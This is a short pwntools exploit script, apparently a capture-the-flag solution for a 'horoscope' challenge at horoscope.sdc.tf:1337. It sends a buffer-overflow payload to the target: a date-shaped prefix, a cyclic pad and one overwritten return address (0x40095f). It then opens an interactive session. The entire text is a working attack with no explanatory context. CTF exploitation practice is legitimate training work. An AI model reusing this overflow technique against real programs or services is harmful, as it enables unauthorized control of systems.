from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('horoscope.sdc.tf', 1337)
    else:
        return process(e.path)

p = start()

pad =b'6/1/22'+cyclic(50)
chain = p64(0x40095f)
p.sendline(pad+chain)
p.interactive()


